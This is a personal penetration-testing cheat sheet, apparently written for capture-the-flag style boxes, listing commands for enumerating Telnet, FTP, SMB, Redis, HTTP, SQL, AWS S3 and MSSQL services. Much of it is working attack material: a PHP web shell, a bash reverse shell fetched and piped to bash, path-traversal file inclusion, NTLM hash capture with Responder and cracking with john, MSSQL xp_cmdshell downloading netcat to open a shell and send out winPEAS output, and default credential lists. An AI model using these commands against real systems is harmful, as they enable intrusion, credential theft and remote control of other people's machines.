---
date: "2025-07-24"
layout: "single"
hidemeta: true
---

# 🔍 nmap (EZ scan) : no ping w/service+scripts scan
```shell
nmap -Pn -sV -sC -T4 -p 1-9999 <HOST>
# -A interrogates service more but is SLOW (limit with ports)
nmap -Pn -sV -p <PORT> -T4 <IP_ADDRESS>  # find service
```

# 📡 Telnet
```shell
telnet <HOST>
root
# no password
```

# 📁 FTP :: passive, anonymous
```shell
ftp -p -a <HOST>
anonymous
# no password
ls
get
!<COMMAND>  # run local (outside of FTP) command
```

# 📂 SMB list shares (without pasword)
```shell
smbclient -N --list <HOSTNAME>
# Login in anonymously ; omit <PASSWORD> to not use pass
smbclient --password=<PASSWORD> '\\<HOSTNAME>\<SHARE>'
ls
get <FILE>
recurse # toggles dir recursion

# * ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled.
# * C$ - Administrative share for the C:\ disk volume. This is where the operating system is hosted.
# * IPC$ - The inter-process communication share. Used for inter-process communication via named
pipes and is not part of the file system
```

# 🗄️ Redis

* https://redis.io/docs/manual/cli/

```shell
redis-cli -h <IP_ADDRESS>
> INFO 
> CONFIG GET databases
> INFO keyspace
> SELECT <DB_INDEX>
> KEYS *
> GET flag
```

# 🌐 HTTP

```shell
# File Search
gobuster dir --threads 100 --wordlist /usr/share/wordlists/dirb/common.txt --expanded --url <URL>
gobuster dir --threads 100 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt --extensions php,htm,html,txt --url <URL>
# Subdomain search
sudo apt install -y seclists
gobuster vhost --threads 100 --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url <URL>

# Login for SQLi: root, administrator, admin
user: <USER>
pass: .

# browser plugin Wappalyzer
# enumerates web server + version + OS + frameworks + JS libraries

wapiti --url <URL>
```

# 🗂️ Local file inclusion vulnerability
```shell
curl -o- <URL>/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

# 🛢️ SQL

* https://www.mysqltutorial.org/mysql-cheat-sheet.aspx

```shell
# add -A (aggressive) to better enumerate SQL service
nmap -Pn -sV -p 3306 -A <IP_ADDRESS>  # better interrogate service

# yay SQL client
mycli -u root -h <IP_ADDRESS>

# MariaDB-specific commands
SHOW databases ;
use <TABLE> ;
SHOW tables ;
SELECT * FROM <TABLE> ;
```

# 🔑 Password Default Brute forces
```shell
admin:admin
guest:guest
user:user
root:root
administrator:password
```

# ☁️ AWS

* https://awscli.amazonaws.com/v2/documentation/api/latest/index.html

```shell
sudo apt install -y awscli

aws configure  # must give values even if not used
aws --endpoint=<S3_URL> s3 ls
aws --endpoint=<S3_URL> s3 ls s3://<DOMAIN>
aws --endpoint=<S3_URL> s3 cp <FILE> s3://<DOMAIN>
```

# 🐘 Simple PHP Web Shell
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -o- http://<DOMAIN>/shell.php?cmd=<COMMAND>
# spaces and other special characters might require special encoding:
# https://en.wikipedia.org/wiki/Percent-encoding#Reserved_characters
# curl -o- http://<DOMAIN>/shell.php?cmd=ls+-la
```

# 🐚 Interactive bash reverse shell via `shell.php`
```shell
echo '#!/bin/bash
bash -i >& /dev/tcp/<CALLBACK_IP>/<LISTENING_PORT> 0>&1' > shell.sh
python3 -m http.server <PORT>  # host shell.sh

nc -nvlp <LISTENING_PORT>

curl -o- <URL>/shell.php?cmd=curl%20<IP_ADDRESS>:<PORT>/shell.sh%7Cbash
curl -o- <URL>/shell.php?cmd=wget%20-O-%20<IP_ADDRESS>:<PORT>/shell.sh%7Cbash  # for targets without curl
```

# 🗃️ Local File Inclusion (LFI) vulnerability

* https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

# 🛑 REQUIRED: responder listening
```shell
# set listening services in: /etc/responder/Responder.conf
sudo responder -I <INTERACE>

# https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#lfi
curl -o- <URL>/index.php?page=//<CALLBACK_IP>/somefile

# Copy everything after \/ below \/ to file
# https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
# https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash
# https://nthashes.com/
# [SMB] NTLMv2-SSP Hash     : <USER>:<HOST>:<HASH>...

# Use john to crack
# https://www.openwall.com/john/doc/
john -w=<WORDLIST> <NTLM_HASH_FILE>

# Use evil-winrm to access machine
# https://github.com/Hackplayers/evil-winrm

evil-winrm -i <HOST> -u <USER> -p <PASSWORD>
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Name flag.txt
```

# 🖥️ MSSQL

* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
* https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

```shell
/usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth '<DOMAIN>/<USER>:<PASSWORD>@<IP_ADDRESS>'

select @@version;

enable_xp_cmdshell
xp_cmdshell "powershell.exe -exec bypass -c wget http://10.10.14.190:8000/nc64.exe -outfile ../../Users/<USER>/Desktop/nc64.exe"

nc -lvnp 443
xp_cmdshell "powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe -e cmd.exe <CALLBACK_IP> 443"

cd ~/Downloads/ && python3 -m http.server 8000 &
powershell.exe -exec bypass -c wget http://<CALLBACK_IP>:8000/winPEASx64.exe -outfile ../../Users/<USER>/Desktop/winPEASx64.exe"
powershell.exe -exec bypass ../../Users/<USER>/Desktop/winPEASx64.exe > ../../Users/<USER>/Desktop/winPEASx64.txt

nc -nvlp 444 > winPEASx64.txt

powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe <CALLBACK_IP> 444 < ../../Users/<USER>/Desktop/winPEASx64.txt

git clone https://github.com/SecureAuthCorp/impacket.git
python3 setup.py build
python3 setup.py install
cd examples
```

# ⬆️ Upgrade Shell

* https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
# echo $TERM # TERM
# stty -a # rows & columns
stty raw -echo
fg
reset
export SHELL=bash
export TERM=<BLAH>
stty rows <ABOVE> columns <ABOVE>
```